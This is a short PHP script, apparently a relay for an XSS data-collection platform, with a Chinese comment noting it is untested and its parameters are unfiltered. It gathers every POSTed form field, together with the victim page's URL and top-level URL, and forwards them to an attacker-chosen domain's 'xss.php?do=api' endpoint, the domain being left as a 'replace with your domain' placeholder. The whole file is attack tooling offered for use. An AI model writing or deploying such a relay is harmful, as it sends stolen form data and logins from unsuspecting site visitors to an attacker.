<?php
/* 
 * 	【注意】【注意】【注意】 文件并未做测试，大家自测此文件，，，注意下方参数没有做过滤。
* @Author: Sunshie
* @Date:   2014-10-10 14:28:42
* @Last Modified by:   Sunshie
* @Last Modified time: 2014-10-10 14:33:33
*/
	if(empty($_GET['id'])){
		exit("404 Not Found");
	}
    $id = trim($_GET['id']);
    $data = $_POST;
	$location = trim($_GET['url']);
	$locationtop = trim($_GET['topurl']);
    foreach($data as $k=>$v){
        $d.= "{$k}={$v}&";
    }
    $d=urlencode(rtrim($d,"&"));
    file_get_contents("http://替换成你的域名/xss.php?do=api&id={$id}&data={$d}&location={$location}&locationtop={$locationtop}");
    
?>